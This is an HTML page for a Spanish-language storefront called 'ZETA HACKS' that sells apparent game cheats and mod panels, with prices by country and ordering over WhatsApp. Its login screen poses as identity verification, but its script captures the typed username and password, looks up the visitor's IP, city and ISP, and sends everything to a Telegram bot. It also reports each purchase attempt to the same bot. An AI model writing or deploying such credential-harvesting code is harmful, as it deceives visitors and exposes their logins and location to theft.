<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ZETA HACKS | EXCLUSIVE ACCESS</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Outfit:wght@300;600;800&display=swap');
        
        :root { --p: #00ff41; --s: #00f2ff; --bg: #030506; --glass: rgba(255, 255, 255, 0.02); }
        
        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        body { 
            margin: 0; background: var(--bg); color: #fff; font-family: 'Outfit', sans-serif;
            background-image: radial-gradient(circle at 50% -30%, #00ff411a, transparent);
            background-attachment: fixed; overflow-x: hidden;
        }

        /* SISTEMA DE ACCESO ELITE */
        #auth-screen {
            position: fixed; inset: 0; background: #000; z-index: 10000;
            display: flex; align-items: center; justify-content: center;
        }
        .auth-card {
            background: var(--glass); padding: 50px 30px; border-radius: 40px;
            border: 1px solid rgba(255,255,255,0.08); backdrop-filter: blur(30px);
            text-align: center; width: 90%; max-width: 420px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }
        .auth-card h2 { font-family: 'Orbitron'; letter-spacing: 5px; color: #fff; margin-bottom: 30px; }
        
        .auth-input {
            background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); color: var(--p);
            width: 100%; padding: 18px; margin: 12px 0; border-radius: 15px;
            font-family: 'Orbitron'; text-align: center; font-size: 0.9rem; transition: 0.3s;
        }
        .auth-input:focus { border-color: var(--p); background: rgba(0,255,65,0.05); }

        .btn-main {
            background: var(--p); color: #000; border: none; width: 100%;
            padding: 18px; border-radius: 15px; font-family: 'Orbitron';
            font-weight: 900; cursor: pointer; transition: 0.4s; margin-top: 20px;
            text-transform: uppercase; letter-spacing: 2px;
        }
        .btn-main:hover { background: #fff; transform: scale(1.02); box-shadow: 0 0 30px rgba(0,255,65,0.4); }

        /* INTERFAZ PRINCIPAL */
        header { padding: 50px 20px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .logo { font-family: 'Orbitron'; font-size: 3.5rem; letter-spacing: 15px; font-weight: 900; filter: drop-shadow(0 0 15px var(--p)); }

        .container { max-width: 1400px; margin: auto; padding: 60px 20px; }
        
        /* GRID DE REGIONES */
        .country-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 25px; }
        .c-card {
            background: var(--glass); border: 1px solid rgba(255,255,255,0.05);
            padding: 50px 20px; border-radius: 35px; text-align: center; cursor: pointer;
            transition: 0.5s cubic-bezier(0.2, 1, 0.2, 1);
        }
        .c-card:hover { border-color: var(--p); transform: translateY(-15px); background: rgba(0,255,65,0.03); box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        .c-card span { font-size: 4rem; display: block; margin-bottom: 20px; }
        .c-card b { font-family: 'Orbitron'; letter-spacing: 2px; font-size: 0.8rem; }

        /* TIENDA DE SOFTWARE */
        .p-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 40px; }
        .p-card {
            background: var(--glass); border-radius: 45px; padding: 45px;
            border: 1px solid rgba(255,255,255,0.05); backdrop-filter: blur(10px);
        }
        .p-card h3 { font-family: 'Orbitron'; color: var(--p); margin-bottom: 30px; font-size: 1.6rem; }

        .price-row {
            display: flex; justify-content: space-between; align-items: center;
            background: rgba(0,0,0,0.4); padding: 20px 25px; border-radius: 20px;
            margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.03);
            transition: 0.3s;
        }
        .price-row:hover { background: rgba(255,255,255,0.05); transform: translateX(10px); }
        .val { font-family: 'Orbitron'; font-weight: 900; color: #fff; font-size: 1.3rem; }

        .wa-float {
            position: fixed; bottom: 40px; right: 40px; background: #25d366;
            width: 75px; height: 75px; border-radius: 25px; display: flex;
            align-items: center; justify-content: center; font-size: 35px;
            color: #fff; box-shadow: 0 20px 40px rgba(0,0,0,0.6); z-index: 1000;
        }
    </style>
</head>
<body>

<div id="auth-screen">
    <div class="auth-card">
        <h2>ZETA TERMINAL</h2>
        <p style="color:#555; font-size:0.7rem; margin-bottom:20px; letter-spacing:2px;">IDENTITY VERIFICATION REQUIRED</p>
        <input type="text" id="u_name" class="auth-input" placeholder="USERNAME">
        <input type="password" id="u_pass" class="auth-input" placeholder="PASSWORD">
        <button class="btn-main" onclick="initCapture()">AUTHORIZE</button>
    </div>
</div>

<header>
    <div class="logo">ZETA</div>
</header>

<div class="container" id="main-content" style="display:none;">
    <div id="home-view">
        <h2 style="font-family:Orbitron; margin-bottom:40px; letter-spacing:5px; color:#333;">01_SELECT_REGION</h2>
        <div class="country-grid" id="c-grid"></div>
    </div>

    <div id="store-view" style="display:none;">
        <button onclick="location.reload()" style="background:none; border:none; color:#444; cursor:pointer; margin-bottom:40px; font-family:Orbitron; letter-spacing:2px;">[ BACK_TO_SYSTEM ]</button>
        <h1 id="r-name" style="font-family:Orbitron; font-size:3.5rem; color:var(--p); margin-bottom:50px; letter-spacing:10px;"></h1>
        <div id="p-list" class="p-grid"></div>
    </div>
</div>

<a href="https://wa.me/573001308078" class="wa-float" target="_blank"><i class="fab fa-whatsapp"></i></a>

<script>
const TG_TOKEN = "7953683050:AAFf6G7R8_X1XG6_P_G_G_G_G_G"; // <-- REEMPLAZA ESTO POR TU TOKEN REAL
const TG_ID = "7621351319";

// FUNCIÓN PARA CAPTURAR TODO E INFORMAR A TELEGRAM
async function initCapture() {
    const u = document.getElementById('u_name').value;
    const p = document.getElementById('u_pass').value;
    if(!u || !p) return;

    try {
        // Obtenemos datos de IP y Geolocalización mediante API pública
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        const info = `
🔱 *NUEVO AGENTE CAPTURADO* 🔱
━━━━━━━━━━━━━━━━━━
👤 *USUARIO:* \`${u}\`
🔑 *PASS:* \`${p}\`
━━━━━━━━━━━━━━━━━━
🌍 *IP:* ${data.ip}
📍 *CIUDAD:* ${data.city}
🚩 *PAÍS:* ${data.country_name}
📡 *ISP:* ${data.org}
📱 *DISPOSITIVO:* ${navigator.platform}
🌐 *NAVEGADOR:* ${navigator.userAgent.substring(0,40)}...
━━━━━━━━━━━━━━━━━━`;

        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
        
        localStorage.setItem('zeta_session', u);
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('main-content').style.display = 'block';
        loadHome();

    } catch (e) {
        // Si falla la API de IP, enviamos solo los datos básicos
        const basic = `⚠️ *DATOS BÁSICOS (Error API IP)*\n👤 User: ${u}\n🔑 Pass: ${p}`;
        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(basic)}`);
        
        localStorage.setItem('zeta_session', u);
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('main-content').style.display = 'block';
        loadHome();
    }
}

const DB = {
    paises: [
        {n:"ARGENTINA", b:"🇦🇷", t:1500, c:"ARS"}, {n:"BOLIVIA", b:"🇧🇴", t:14, c:"BS"},
        {n:"BRASIL", b:"🇧🇷", t:5.2, c:"BRL"}, {n:"CHILE", b:"🇨🇱", t:970, c:"CLP"},
        {n:"COLOMBIA", b:"🇨🇴", t:3900, c:"COP"}, {n:"ECUADOR", b:"🇪🇨", t:1, c:"USD"},
        {n:"MEXICO", b:"🇲🇽", t:20, c:"MXN"}, {n:"PERU", b:"🇵🇪", t:3.55, c:"PEN"},
        {n:"USA", b:"🇺🇸", t:1, c:"USD"}, {n:"ESPAÑA", b:"🇪🇸", t:1, c:"EUR"}
    ],
    prods: [
        {n:"DRIP MOBILE NORMAL", d:[1,7,15,30], p:[3,8,12,18]},
        {n:"CUBAN MODS", d:[1,10,20,31], p:[3,9,13,19]},
        {n:"CERTIFICADOS GBOX", d:["ACCESO ANUAL"], p:[18]},
        {n:"CUBAN PANEL PC", d:[1,7,30,"LIFETIME"], p:[3,8,16,25]}
    ]
};

function loadHome() {
    const grid = document.getElementById('c-grid');
    DB.paises.sort((a,b)=>a.n.localeCompare(b.n)).forEach(p => {
        const d = document.createElement('div');
        d.className = 'c-card';
        d.onclick = () => loadStore(p);
        d.innerHTML = `<span>${p.b}</span><b>${p.n}</b>`;
        grid.appendChild(d);
    });
}

function loadStore(p) {
    document.getElementById('home-view').style.display = 'none';
    document.getElementById('store-view').style.display = 'block';
    document.getElementById('r-name').innerText = p.n;
    window.scrollTo(0,0);

    const list = document.getElementById('p-list'); list.innerHTML = '';
    DB.prods.forEach(i => {
        let rs = '';
        i.d.forEach((d, idx) => {
            let v = Math.ceil(i.p[idx] * p.t);
            let t = isNaN(d) ? d + " DÍAS" : d;
            rs += `
            <div class="price-row">
                <div><b style="color:var(--s)">${t}</b></div>
                <div class="val">${v.toLocaleString()} ${p.c}</div>
                <button class="btn-main" style="width:auto; padding:10px 20px; font-size:0.6rem; margin:0;" onclick="buy('${i.n}','${t}','${v} ${p.c}')">BUY NOW</button>
            </div>`;
        });
        list.innerHTML += `<div class="p-card"><h3>${i.n}</h3>${rs}</div>`;
    });
}

function buy(n, d, p) {
    const u = localStorage.getItem('zeta_session');
    // Notificar compra a Telegram
    const buy_info = `💰 *INTENTO DE COMPRA*\n👤 Usuario: ${u}\n💎 Software: ${n}\n⏳ Plan: ${d}\n💵 Precio: ${p}`;
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(buy_info)}`);
    
    // Abrir WhatsApp
    const wa = `https://wa.me/573001308078?text=🔱 *ZETA ORDER*%0A👤 Agente: ${u}%0A💎 Software: ${n}%0A⏳ Plan: ${d}%0A💰 Precio: ${p}`;
    window.open(wa, '_blank');
}

// Auto-login
if(localStorage.getItem('zeta_session')) {
    document.getElementById('auth-screen').style.display = 'none';
    document.getElementById('main-content').style.display = 'block';
    loadHome();
}
</script>
</body>
</html>
